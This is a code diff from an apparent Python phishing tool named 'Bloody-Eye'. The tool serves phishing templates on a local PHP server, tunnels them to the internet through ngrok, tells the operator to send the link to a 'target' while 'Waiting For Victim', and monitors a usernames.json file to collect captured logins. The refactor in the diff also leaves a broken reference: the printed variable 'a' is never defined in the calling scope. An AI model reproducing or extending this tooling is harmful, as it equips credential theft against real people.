@@ -546,6 +546,9 @@ exit();""")
     def phpserver():
        with open("log","w") as phplog:
           Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)  
+    def ngrokserver():
+       global token
+       a = ngrok.connect(6060,"http",auth_token=token)
 
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
@@ -557,11 +560,9 @@ exit();""")
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
-       global token
-       a = ngrok.connect(6060,"http",auth_token=token)
-       print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
-       print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
-# Getting User And Password
+       ngrokserver()
+       print(a)
+ # Getting User And Password
     def userin():
         global stat_file
         if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
